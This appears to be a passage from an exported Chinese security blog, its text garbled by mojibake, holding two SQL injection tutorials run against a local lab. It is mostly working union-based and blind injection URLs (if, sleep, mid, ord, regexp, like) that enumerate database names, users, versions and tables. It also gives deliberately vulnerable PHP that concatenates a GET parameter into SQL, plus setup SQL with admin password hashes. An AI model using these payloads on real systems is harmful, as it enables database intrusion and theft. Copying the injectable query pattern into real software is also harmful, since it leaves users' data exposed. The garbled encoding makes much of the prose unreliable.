åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºr like â€˜ro%â€™ åˆ¤æ–­å‰é¢ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºro like â€˜%ro%â€™ åˆ¤æ–­æ˜¯å¦åŒ…å«roä¸¤ä¸ªå­—ç¬¦ä¸² like â€˜%root%â€™ åˆ¤æ–­æ˜¯å¦åŒ…å«rootå­—ç¬¦ä¸² like â€˜____â€™ åˆ¤æ–­æ˜¯å¦ä¸º4ä¸ªå­—ç¬¦ like â€˜r___â€™ åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºr ifå‡½æ•°if æ¡ä»¶ä¸ºçœŸæ‰§è¡Œï¼Œåä¹‹ä¸æ‰§è¡Œè¯­æ³•ï¼š if(æ¡ä»¶,æ‰§è¡Œ(true),ä¸æ‰§è¡Œ(false)) å…¶å®žifå¾ˆç®€å•ï¼Œçœ‹çœ‹ä¸‹é¢æž„é€ çš„è¿™ä¸ªè¯­å¥å°±çŸ¥é“äº†1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(database()='sqlin',1,0),3 åˆ¤æ–­æ•°æ®åº“æ˜¯å¦ä¸ºsqlinï¼Œå¦‚æžœæ˜¯ï¼Œè¿”å›ž1ï¼Œå¦è€…è¿”å›ž0 sleepå‡½æ•°è¿™ä¸ªå‡½æ•°ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯åœ¨çœŸå®žçŽ¯å¢ƒä¸­ï¼Œå¯èƒ½å—ç½‘ç»œçŽ¯å¢ƒå½±å“ï¼Œè€Œå¯¼è‡´æ•ˆæžœä¸æ˜¯å¤ªæ˜Žæ˜¾sleep æ‰§è¡Œå»¶æ—¶numberç§’è¯­æ³•ï¼š sleep(number)ä¸€èˆ¬è¿™ä¸ªå‡½æ•°æ­é…ifè¯­å¥ä¸€èµ·ç”¨æ¯”å¦‚æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªå‡½æ•°åˆ¤æ–­æ˜¯å¦æœ‰sqlinæ•°æ®åº“1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,sleep(if(database()='sqlin',10,0)),3 åˆ¤æ–­æ•°æ®åº“å¦æœ‰ä¸ºsqlinï¼Œå¦‚æžœæœ‰è¿”å›žçš„10å¸¦å…¥åˆ°sleepï¼Œè®©ç½‘é¡µå»¶æ—¶10ç§’è¿”å›žé¡µé¢ï¼Œå¦åˆ™ç½‘é¡µå»¶æ—¶0ç§’å¦‚æžœç§’é€Ÿè°ƒé«˜ä¸€ç‚¹è¿˜æ˜¯æœ‰ç”¨çš„ï¼Œä½†æ˜¯åªè¿”å›ž1å’Œ0ç§’å°±åŸºæœ¬åºŸäº† lengthå‡½æ•°ç”¨äºŽåˆ¤æ–­é•¿åº¦ï¼Œè¿”å›ž0å’Œ1ï¼Œæ¯”è¾ƒå¸¸ç”¨length ç»Ÿè®¡å­—ç¬¦ä¸²çš„é•¿åº¦è¯­æ³•ï¼š length(number)123http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,length(database())=5,3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(length(database())=5,1,0),3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(length(database())&gt;1,1,0),3 è¿™ä¸ªå¯ä»¥ç”¨&gt; &lt; = ç¬¦å·ï¼Œé»˜è®¤å°±æ˜¯è¿”å›ž1å’Œ0ï¼Œè¿™é‡ŒåŠ ä¸Šifçœ‹ç€æ›´æ¸…æ™° midå’Œsubstrå‡½æ•°è¿™ä¸¤ä¸ªå‡½æ•°åŸºæœ¬å·®ä¸å¤šï¼Œéƒ½æ˜¯ä»Žnumberå¼€å§‹ï¼Œnumberç»“æŸï¼Œæˆªå–ï¼Œè¿™ä¸ªæ˜¯ä»Ž1å¼€å§‹ï¼Œè€Œä¸æ˜¯ä»Ž0å¼€å§‹mid,substr æˆªå–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†è¯­æ³•ï¼š mid(å­—æ®µ,èµ·å§‹ä½ç½®(number),é•¿åº¦(number))123http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,mid(database(),1,1)='s',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,mid(database(),2,1)='q',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,mid(database(),1,5)='sqlin',3 //ä»Žç¬¬ä¸€ä¸ªå¼€å§‹ï¼Œå–5ä¸ªå­—ç¬¦ substr(å­—æ®µ,èµ·å§‹ä½ç½®(number),é•¿åº¦(number))123http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,substr(database(),1,1)='s',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,substr(database(),2,1)='q',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,substr(database(),1,5)='sqlin',3 //ä»Žç¬¬ä¸€ä¸ªå¼€å§‹ï¼Œå–5ä¸ªå­—ç¬¦ ORDå‡½æ•°è¿™ä¸ªå‡½æ•°åªèƒ½è¿”å›žå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å»ºè®®åŠ ä¸Šmidå‡½æ•°ORD è¿”å›žç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²çš„ASCIIç sqlin è½¬æ¢ä¸ºasciiç =115 113 108 105 110è¯­æ³•ï¼š ord(x)1234http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,ord(database())=115,3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,ord(mid(database(),1,1))=115,3 //115=shttp://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,ord(mid(database(),2,1))=113,3 //113=q//å½“ç„¶è¿™ä¸ªä¹Ÿæ˜¯æ”¯æŒ &gt; &lt; = ç¬¦å·çš„ leftå‡½æ•°left å¾—åˆ°å­—ç¬¦ä¸²å·¦éƒ¨æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦left(string,number) stringä¸ºå­—ç¬¦ä¸²ï¼Œnumberä¸ºè¦æˆªå–çš„é•¿åº¦123http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,left(database(),1)='s',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,left(database(),2)='sq',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,left(database(),5)='sqlin',3 regexpæ­£åˆ™è¿™ä¸ªæ­£åˆ™æ˜¯ä¸€ä¸ªå¾ˆå¥½ç”¨çš„åŒ¹é…æ–¹å¼ï¼Œæ¯”å¦‚åŒ¹é…sqlinæ•°æ®åº“regexp â€˜^[a-z]â€™ åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() regexp '^[a-z]',3 regexp â€˜^sâ€™ åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºs1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() regexp '^s',3 regexp â€˜^s[a-z]â€™ åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬äºŒä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() regexp '^s[a-z]',3 likeåŒ¹é…ç™¾åˆ†æ¯”(%)é€šé…ç¬¦å…è®¸åŒ¹é…ä»»ä½•å­—ç¬¦ä¸²çš„é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚ä¸‹åˆ’çº¿(_)é€šé…ç¬¦å…è®¸åŒ¹é…ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚like â€˜s%â€™ åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºs1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like 's%',3 like â€˜sq%â€™ åˆ¤æ–­å‰é¢ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºsq1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like 'sq%',3 like â€˜%sq%â€™ åˆ¤æ–­æ˜¯å¦åŒ…å«sqä¸¤ä¸ªå­—ç¬¦ä¸²1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like '%sq%',3 like â€˜%sqlin%â€™ åˆ¤æ–­æ˜¯å¦åŒ…å«sqlinå­—ç¬¦ä¸²1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like '%sqlin%',3 like â€˜_â€˜ åˆ¤æ–­æ˜¯å¦ä¸º5ä¸ªå­—ç¬¦1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like '_____',3 like â€˜s____â€™ åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºs1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like 's____',3 ç›²æ³¨æ”»å‡»ä¸Šé¢çš„åŸºæœ¬çš„ç›²æ³¨è¯­å¥æˆ‘ä»¬å·²ç»çŸ¥é“äº†ï¼ŒçŽ°åœ¨æ‹¿ç€phpä»£ç ï¼Œæ¥è¿›è¡Œç›²æ³¨ä»£ç :1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sqlæ³¨å…¥&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--author: smelondfilename: index.phpblog: http://smelond.com--&gt;&lt;body/&gt;&lt;/html&gt;&lt;?php $id = $_GET['x']; $link=mysqli_connect("127.0.0.1","root","root","sqlin");//è¿žæŽ¥æ•°æ®åº“ if ($link) &#123;//åˆ¤æ–­æ•°æ®åº“æ˜¯å¦å­˜åœ¨ mysqli_query($link,"set names utf8");//è®¾ç½®ç¼–ç æ ¼å¼ $sql="select * from page where id=$id";//æŸ¥è¯¢ $re=mysqli_query($link,$sql);//æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ $data=mysqli_fetch_assoc($re);//èŽ·å–æ•°æ®åº“è¿”å›žçš„å†…å®¹ echo "æ–‡ç« idï¼š".$data['id']."&lt;hr /&gt;"; echo "æ–‡ç« æ ‡é¢˜ï¼š".$data['title']."&lt;hr /&gt;"; echo "æ–‡ç« å†…å®¹ï¼š".$data['content']."&lt;hr /&gt;"; echo "å½“å‰æ‰§è¡Œsqlè¯­å¥ï¼š".$sql; &#125;else&#123; echo "å¥½åƒå‡ºé”™äº†ï¼ŒåŽŸå› æœ‰å¾ˆå¤š...æ‰€ä»¥ä½ å…ˆåŽ»çœ‹çœ‹ä½ çš„æ•°æ®åº“é…ç½®å¥½æ²¡ã€‚ã€‚ã€‚"; &#125;?&gt; æ•°æ®åº“ï¼šåˆ›å»ºsqlinæ•°æ®åº“ï¼Œåˆ›å»ºadminè¡¨å’Œpageè¡¨ï¼Œå¹¶ä¸”å‘adminã€pageè¡¨é‡Œé¢åˆ†åˆ«æ’å…¥æ•°æ®1234567891011121314create database sqlin default character set utf8 collate utf8_general_ci;use sqlin;mysql&gt; create table admin( -&gt; id int(3) auto_increment not null primary key, -&gt; username varchar(15) not null, -&gt; password char(32));mysql&gt; create table page( -&gt; id int(3) auto_increment not null primary key, -&gt; title varchar(20), -&gt; content varchar(255));mysql&gt; insert into admin(username,password) values('smelond','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into admin(username,password) values('admin','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into page(title,content) values('sqlzhuru','https://smelond.com');mysql&gt; insert into page(title,content) values('test','smelond.com'); åˆ¤æ–­æ•°æ®åº“åï¼Œç”¨æˆ·ï¼Œæ•°æ®ç‰ˆæœ¬1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select database(),user(),version() ç›²æ³¨ï¼š1234567http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,mid(user(),1,1)='r',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,substr(user(),1,1)='r',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,ord(substr(user(),1,1))=114,3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,user() like 'ro%',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,user() regexp '^[r-s]',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,user() regexp '^s',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,length(user())&gt;4,3 è¿™é‡Œæ˜¯ä¸€äº›åŸºæœ¬çš„æž„é€ è¯­æ³•ï¼Œå…¶å®žç›²æ³¨å¹¶ä¸éš¾ï¼Œä¸»è¦å°±æ˜¯è‡ªå·±æž„é€ ï¼Œä½†æ˜¯è¿˜æ˜¯éœ€è¦çŸ¥é“åŸºæœ¬çš„è¯­æ³• ç„¶åŽæˆ‘ç›´æŽ¥å¼€å§‹è¿›è¡Œä¸‹é¢çš„æµ‹è¯•ï¼š èŽ·å–sqlinæ•°æ®åº“ä¸‹çš„è¡¨åï¼š1234http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3 from information_schema.tables where table_schema='sqlin' and length(table_name)=5 limit 0,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3 from information_schema.tables where table_schema='sqlin' and table_name regexp '^[a-z]' limit 0,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3 from information_schema.tables where table_schema='sqlin' and table_name regexp '^admi[a-z]' limit 0,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3 from information_schema.tables where table_schema='sqlin' and table_name regexp '^admin' limit 0,1 èŽ·å–åˆ°äº†adminè¡¨ æˆ‘ä»¬åœ¨ç”¨å…¶ä»–æ–¹æ³•æ¥èŽ·å–å…¶ä»–è¡¨ï¼Œæ–¹æ³•ä¸æ­¢ä¸€ç§ï¼ŒçŸ¥é“äº†è¯­æ³•è‡ªå·±æž„é€ å°±å¯ä»¥äº†123456http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3 from information_schema.tables where table_schema='sqlin'http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(length((select table_name from information_schema.tables where table_schema='sqlin' limit 1,1))&gt;3,1,0),3 from information_schema.tables where table_schema='sqlin'http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(length((select table_name from information_schema.tables where table_schema='sqlin' limit 1,1))=4,1,0),3 from information_schema.tables where table_schema='sqlin'http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(mid((select table_name from information_schema.tables where table_schema='sqlin' limit 1,1),1,1)&gt;'a',1,0),3 from information_schema.tables where table_schema='sqlin'http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(mid((select table_name from information_schema.tables where table_schema='sqlin' limit 1,1),1,1)='p',1,0),3 from information_schema.tables where table_schema='sqlin'http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(mid((select table_name from information_schema.tables where table_schema='sqlin' limit 1,1),1,4)='page',1,0),3 from information_schema.tables where table_schema='sqlin' è¿™ç§æ–¹æ³•æ¯”ä¸Šé¢çœ‹ç€è¦éº»çƒ¦ä¸€äº›ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯èŽ·å–åˆ°äº†pageè¡¨ èŽ·å–ç¬¬äºŒä¸ªè¡¨åï¼š1234http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,table_name regexp '^page',3 from information_schema.tables where table_schema='sqlin' limit 1,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,table_name like 'page',3 from information_schema.tables where table_schema='sqlin' limit 1,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,mid(table_name,1,4)='page',3 from information_schema.tables where table_schema='sqlin' limit 1,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,left(table_name,4)='page',3 from information_schema.tables where table_schema='sqlin' limit 1,1 ç›²æ³¨å…¶å®žå¹¶ä¸éš¾ï¼Œä¸»è¦æ˜¯æž„é€ ä¸€äº›å¥‡å½¢æ€ªçŠ¶è¯­å¥è¿›è¡Œsqlæ”»å‡»ï¼Œåªè¦çŸ¥é“äº†è¯­æ³•å°±å¯ä»¥è‡ªå·±æ…¢æ…¢æž„é€ äº†ï¼Œè¶£å»ºè®®äº†è§£ä¸€ä¸‹sqlè¯­è¨€]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlæ³¨å…¥ä¹‹æ³¨å…¥ç±»åž‹]]></title>
    <url>%2F2018%2F04%2F02%2Fsql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[æ•°å­—åž‹æ•°å­—åž‹åœ¨ä¸Šä¸€ç¯‡æ–‡ç« sqlæ³¨å…¥ä¹‹å…¥é—¨ï¼Œå·²ç»è®²è¿‡ æ•°å­—åž‹ç®€å•çš„åˆ¤æ–­æ˜¯å¦æœ‰æ³¨å…¥12and 1=1 //è¿”å›žæ­£å¸¸and 1=2 //è¿”å›žé”™è¯¯ å­—ç¬¦ä¸²åž‹å¦‚ä½•åˆ¤æ–­å­—ç¬¦ä¸²åž‹æ˜¯å¦æœ‰æ³¨å…¥é¦–å…ˆå…ˆåˆ›å»ºä¸€ä¸ªæ•°æ®åº“ï¼Œåœ¨é‡Œé¢åˆ†åˆ«åˆ›å»ºä¸¤ä¸ªè¡¨ï¼Œadminï¼Œpageï¼Œç„¶åŽåœ¨é‡Œé¢æ’å…¥æ•°æ®1234567891011121314mysql&gt; create database sqlinstr default character set utf8 collate utf8_general_ci;mysql&gt; use sqlinstr;mysql&gt; create table admin( id int(3) auto_increment not null primary key, username varchar(15) not null, password char(32));mysql&gt; create table page( id int(3) auto_increment not null primary key, title varchar(20), content varchar(255));mysql&gt; insert into admin(username,password) values('smelond','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into admin(username,password) values('admin','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into page(title,content) values('sqlzhuru','https://smelond.com');mysql&gt; insert into page(title,content) values('test','smelond.com'); æ‹¿ç€æˆ‘ä»¬çš„phpä»£ç ï¼š123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sqlæ³¨å…¥-æ³¨å…¥ç±»åž‹-å­—ç¬¦ä¸²&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--author: smelondfilename: index.phpblog: http://smelond.comsqlæ³¨å…¥-æ³¨å…¥ç±»åž‹-å­—ç¬¦ä¸²--&gt;&lt;body/&gt;&lt;/html&gt;&lt;?php $id = $_GET['x']; $link=mysqli_connect("127.0.0.1","root","root","sqlinstr");//è¿žæŽ¥sqlinstræ•°æ®åº“ if ($link) &#123;//åˆ¤æ–­æ•°æ®åº“æ˜¯å¦å­˜åœ¨ mysqli_query($link,"set names utf8");//è®¾ç½®ç¼–ç æ ¼å¼ $sql="select * from page where id='$id'";//æŸ¥è¯¢ $re=mysqli_query($link,$sql);//æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ $data=mysqli_fetch_assoc($re);//èŽ·å–æ•°æ®åº“è¿”å›žçš„å†…å®¹ echo "æ–‡ç« idï¼š".$data['id']."&lt;hr /&gt;"; echo "æ–‡ç« æ ‡é¢˜ï¼š".$data['title']."&lt;hr /&gt;"; echo "æ–‡ç« å†…å®¹ï¼š".$data['content']."&lt;hr /&gt;"; echo "å½“å‰æ‰§è¡Œsqlè¯­å¥ï¼š".$sql; &#125;else&#123; echo "å¥½åƒå‡ºé”™äº†ï¼ŒåŽŸå› æœ‰å¾ˆå¤š...æ‰€ä»¥ä½ å…ˆåŽ»çœ‹çœ‹ä½ çš„æ•°æ®åº“é…ç½®å¥½æ²¡ã€‚ã€‚ã€‚"; &#125;?&gt; æ‰“å¼€æˆ‘ä»¬çš„ç½‘å€http://127.0.0.1/webpentest/str/index.phpæ‰“å¼€ä¼šåŽçœ‹åˆ°ä¸‹é¢çš„å½“å‰æ‰§è¡Œsqlè¯­å¥ï¼šselect * from page where id=â€™â€™ä¼ å€¼è¿›åŽ»ï¼š æ–‡ç« idï¼š1æ–‡ç« æ ‡é¢˜ï¼šsqlzhuruæ–‡ç« å†…å®¹ï¼šhttps://smelond.comå½“å‰æ‰§è¡Œsqlè¯­å¥ï¼šselect * from page where id=â€™1â€™è¿™ä¸ªæ—¶å€™å†…å®¹å·²ç»æŸ¥è¯¢å‡ºæ¥äº†ï¼Œä½†æ˜¯å‘çŽ°åŽé¢çš„id=â€™1â€™ï¼Œ1è¢«å•å¼•å·æ‹¬èµ·æ¥äº† å¦‚ä½•æ³¨å…¥é¦–å…ˆæˆ‘ä»¬è¯•è¯•ï¼šand 1=112http://127.0.0.1/webpentest/str/index.php?x=1 and 1=1 //ç»“æžœè¿”å›žæ­£å¸¸å½“å‰æ‰§è¡Œsqlè¯­å¥ï¼šselect * from page where id='1 and 1=1' //æœ‰æ²¡æœ‰å‘çŽ°è¿™é‡Œæ€ªæ€ªçš„ and 1=212http://127.0.0.1/webpentest/str/index.php?x=1 and 1=2 //ç»“æžœè¿˜æ˜¯è¿”å›žæ­£å¸¸ï¼Œéš¾é“æ²¡æœ‰æ³¨å…¥ï¼Ÿï¼Ÿï¼Ÿå½“å‰æ‰§è¡Œsqlè¯­å¥ï¼šselect * from page where id='1 and 1=2' ä»Žä¸Šé¢æˆ‘ä»¬çœ‹åˆ°ï¼šid=â€™1 and 1=1â€™ å’Œ id=â€™1 and 1=2â€™ï¼Œå‘çŽ°æˆ‘ä»¬è¾“å…¥è¿›åŽ»çš„å†…å®¹å…¨éƒ¨è¢«â€™â€™åŒ…è£¹èµ·æ¥äº†é‚£ä¸ºä»€ä¹ˆä¼šè¿”å›žæ­£å¸¸å‘¢ï¼Ÿæ‰“å¼€mysqlï¼š123456789101112131415mysql&gt; select id from page where id='1 and 1=1';+----+| id |+----+| 1 |+----+1 row in set, 1 warning (0.00 sec)mysql&gt; select id from page where id='1 and 1=2';+----+| id |+----+| 1 |+----+1 row in set, 1 warning (0.00 sec) è¿™å›žçŸ¥é“ä¸ºä»€ä¹ˆä¼šæœ‰è¿”å›žå€¼äº†å§ï¼Œå¯ä»¥çœ‹å‡ºç©ºæ ¼åŽé¢çš„åº”è¯¥æ˜¯ç›´æŽ¥è¢«æˆªæ–­äº†ï¼Œæ‰€æœ‰ç†è®ºä¸ŠæŸ¥è¯¢çš„è¿˜æ˜¯id=1 å¦‚ä½•çªç ´ç”±äºŽçœ‹åˆ°ä¸Šé¢æ¯ä¸€æ¡sqlè¯­å¥åŽé¢éƒ½æœ‰ä¸€ä¸ªâ€™å•å¼•å·ï¼Œå‰é¢ä¹Ÿæœ‰ä¸€ä¸ªæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨id=1åŽé¢åŠ ä¸Šä¸€ä¸ªâ€™å•å¼•å·ï¼Œçœ‹ä¸€ä¸‹æ˜¯ä»€ä¹ˆæ•ˆæžœ1http://127.0.0.1/webpentest/str/index.php?x=1' å½“æˆ‘ä»¬æ‰§è¡Œè¿™ä¸ªç½‘å€æ—¶ï¼Œå‘çŽ°é¡µé¢æŠ¥é”™äº†ï¼Œè¿™ä¸ªæ—¶å€™åº”è¯¥å°±å¯ä»¥åˆ¤æ–­æ˜¯å¦æœ‰æ³¨å…¥äº†æŠ¥é”™ï¼Œè¡¨ç¤ºä»–åº”è¯¥æ˜¯ä»Žæ•°æ®åº“é‡Œé¢æŸ¥è¯¢çš„æŠ¥é”™ä¿¡æ¯ï¼š1Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, boolean given in D:\phpStudy\PHPTutorial\WWW\webpentest\str\index.php on line 21 ä¸‹é¢æœ‰å½“å‰æ‰§è¡Œsqlè¯­å¥ï¼šselect * from page where id=â€™1â€™â€™ å¯ä»¥çœ‹åˆ°1â€™æˆåŠŸçš„å¸¦å…¥è¿›åŽ»äº† æŽ¥ä¸‹æ¥ç»§ç»­æž„é€ æ³¨å…¥è¯­å¥ï¼š12x=1' and '1'='1http://127.0.0.1/webpentest/str/index.php?x=1' and '1'='1 é‚£ä¹ˆæ‰§è¡Œçš„è¯­å¥å°†ä¼šæ˜¯è¿™æ ·çš„1å½“å‰æ‰§è¡Œsqlè¯­å¥ï¼šselect * from page where id='1' and '1'='1' ä¸Šé¢æˆ‘ä»¬åˆçœ‹åˆ°id=â€™1â€™ and â€˜1â€™=â€™1â€™ï¼Œå¹¶ä¸”é¡µé¢è¿”å›žæ­£å¸¸äº†ï¼Œè¿™å›žæ²¡æ¯›ç—…äº†å§ï¼Œå“ˆå“ˆå“ˆï¼ï¼ï¼ æŽ¥ç€æž„é€ è¯­å¥ï¼š1x=1' and '1'='2 æ‰§è¡Œè¯­å¥ï¼š1http://127.0.0.1/webpentest/str/index.php?x=1' and '1'='2 çŽ°åœ¨å·²ç»æœ‰äº†æˆ‘ä»¬æƒ³è¦çš„ç»“æžœäº†ï¼Œé¡µé¢æ²¡æœ‰æ­£å¸¸æ˜¾ç¤ºå½“å‰æ‰§è¡Œçš„sqlè¯­å¥ï¼š1select * from page where id='1' and '1'='2' ä½¿ç”¨ä¸€äº›å¸¸ç”¨çš„å…³é”®å­—é‚£ä¹ˆï¼Œorder byåœ¨å“ªé‡ŒåŠ ï¼Ÿåœ¨è¿™é‡Œï¼Œå…¶å®žorder byæ˜¯ä¸èµ·ä½œç”¨çš„å·²ç»å¯ä»¥çœ‹å‡ºï¼Œand â€˜1â€™=â€™1åŽé¢æ˜¯ä¸èƒ½åŠ äº†ï¼Œå¦‚æžœåŠ ä¸ŠåŽ»ï¼Œè¯­å¥ä¼šå˜æˆä½†æ˜¯åŠ åˆ°å‰é¢ï¼Œæ— è®ºorder by number=? éƒ½ä¼šæ˜¯æ­£å¸¸è¿”å›žå€¼ï¼Œæ‰€ä»¥ï¼Œè¿™ä¸ªåœ°æ–¹order byä¸èƒ½ç”¨12345select * from page where id='1' and '1'='1 order by 3' select * from page where id='1' and '1'='2 order by 3' http://127.0.0.1/webpentest/str/index.php?x=1' order by 3 and '1'='1 //é¡µé¢è¿”å›žæ­£å¸¸http://127.0.0.1/webpentest/str/index.php?x=1' order by 4 and '1'='1 //é¡µé¢è¿”å›žæ­£å¸¸http://127.0.0.1/webpentest/str/index.php?x=1' order by 100 and '1'='1 //é¡µé¢è¿”å›žæ­£å¸¸ çœ‹åˆ°ä¸Šé¢çš„100éƒ½èƒ½è¿”å›žæ­£å¸¸ï¼Œä½†æ˜¯æˆ‘ä»¬æ•°æ®åº“é‡Œé¢çš„pageè¡¨åªæœ‰3ä¸ªå­—æ®µï¼Œæ‰€ä»¥ï¼Œå¯ä»¥çœ‹å‡ºorder byåœ¨è¿™é‡Œæ˜¯æœ‰é—®é¢˜çš„ æ—¢ç„¶order byæœ‰é—®é¢˜ï¼Œé‚£æˆ‘ä»¬è¯•è¯•selectä¼šæ€Žä¹ˆæ ·ï¼Ÿ 1234http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select 1 and '1'='1 //é¡µé¢æŠ¥é”™http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select 1,2 and '1'='1 //é¡µé¢æŠ¥é”™http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select 1,2,3 and '1'='1 //é¡µé¢æ­£å¸¸æ˜¾ç¤ºhttp://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select 1,2,3,4 and '1'='1 //é¡µé¢æŠ¥é”™ select å·²ç»åˆ¤æ–­å‡ºæ¥äº†æœ‰ä¸‰ä¸ªå­—æ®µï¼Œåœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œselect 1æ˜¯ä¸ä¼šæŠ¥é”™çš„ï¼Œåœ¨å­—æ®µæ€»æ•°ä»¥å‰éƒ½ä¸ä¼šæŠ¥é”™ï¼Œå¯èƒ½ä½¿æˆ‘è¿™é‡Œçš„phpä»£ç å†™çš„æœ‰é—®é¢˜ï¼Œæ‰å¯¼è‡´äº†è¿™ç§æƒ…å†µå‘ç”Ÿ æŽ¥ç€æŸ¥è¯¢ä¸€ä¸‹æ•°æ®åº“é‡Œç‰ˆæœ¬ï¼Œç”¨æˆ·ç­‰ç­‰ï¼š1http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select concat(database(),'---',user(),'---',version()),2,3 and '1'='2 ç»“æžœï¼šsqlinstr---root@localhost---5.5.53 å‰©ä¸‹çš„çˆ†åº“çˆ†è¡¨å‰é¢é‡Œé¢å·²ç»è¯´è¿‡äº† 